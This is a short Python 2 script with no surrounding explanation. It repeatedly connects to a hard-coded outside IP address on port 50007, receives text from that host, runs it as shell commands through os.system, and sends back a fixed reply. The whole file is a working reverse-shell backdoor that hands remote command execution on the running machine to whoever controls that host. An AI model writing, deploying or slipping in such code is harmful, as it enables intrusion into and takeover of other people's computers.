import socket
import os

HOST='104.225.155.60'
PORT=50007

while 1:
 try:
  print 'Try connect'
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((HOST,PORT))
  print 'Connect success'
  while 1:
      data = s.recv(1024)
      if data != '1':
          os.system(data)
          s.send('drcom shutdown')
      else:
          s.send('1')
 except socket.error as e:
  print 'Connect break'
 finally: 
  s.close()

